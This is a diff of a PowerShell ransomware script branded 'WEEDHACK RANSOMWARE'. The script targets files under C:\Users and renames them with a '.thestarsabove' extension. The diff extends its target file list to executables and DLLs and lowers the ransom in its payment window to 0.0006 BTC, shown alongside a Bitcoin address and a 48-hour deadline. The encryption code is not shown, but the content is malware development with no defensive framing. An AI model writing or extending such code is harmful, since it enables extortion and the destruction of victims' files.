@@ -1,7 +1,7 @@
 $Target = "C:\Users"
 $Extension = ".thestarsabove"
 $Delay = 30
-$FileTypes = @('.txt', '.pdf', '.docx', '.xlsx', '.xls', '.doc', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mkv', '.mp3', '.wav', '.zip', '.rar', '.7z', '.tar', '.gz', '.sql', '.mdb', '.db', '.json', '.xml', '.config', '.py', '.js', '.java', '.cpp', '.cs', '.html', '.css', '.php')
+$FileTypes = @('.txt', '.pdf', '.docx', '.xlsx', '.xls', '.doc', '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.mp4', '.avi', '.mkv', '.mp3', '.wav', '.zip', '.rar', '.7z', '.tar', '.gz', '.sql', '.mdb', '.db', '.json', '.xml', '.config', '.py', '.js', '.java', '.cpp', '.exe', '.dll', '.cs', '.html', '.css', '.php')
 
 Write-Host "========================================" -ForegroundColor Red
 Write-Host "          WEEDHACK RANSOMWARE           " -ForegroundColor Red
@@ -89,7 +89,7 @@ $label2.Font = New-Object Drawing.Font("Arial", 10)
 $form.Controls.Add($label2)
 
 $label3 = New-Object Windows.Forms.Label
-$label3.Text = "Send 0.25 BTC to: bc1q0lsa3tny22jndz74eaelzwdd6ydpaqwzzrzn4p"
+$label3.Text = "Send 0.0006 BTC to: bc1q0lsa3tny22jndz74eaelzwdd6ydpaqwzzrzn4p"
 $label3.AutoSize = $true
 $label3.Location = New-Object Drawing.Size(20, 90)
 $label3.Font = New-Object Drawing.Font("Arial", 10, [Drawing.FontStyle]::Bold)
@@ -97,7 +97,7 @@ $form.Controls.Add($label3)
 
 $textbox = New-Object Windows.Forms.TextBox
 $textbox.Multiline = $true
-$textbox.Text = "All your documents, images, videos, and archives have been encrypted.`n`nTo recover your files, you must pay 0.25 BTC within 48 hours.`n`n`nPayment address: bc1q0lsa3tny22jndz74eaelzwdd6ydpaqwzzrzn4p`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
+$textbox.Text = "All your documents, images, videos, and archives have been encrypted.`n`nTo recover your files, you must pay 0.0006 BTC within 48 hours.`n`n`nPayment address: bc1q0lsa3tny22jndz74eaelzwdd6ydpaqwzzrzn4p`n`nDO NOT attempt to decrypt files yourself - you will lose them permanently."
 $textbox.Size = New-Object Drawing.Size(650, 180)
 $textbox.Location = New-Object Drawing.Size(20, 120)
 $textbox.ReadOnly = $true
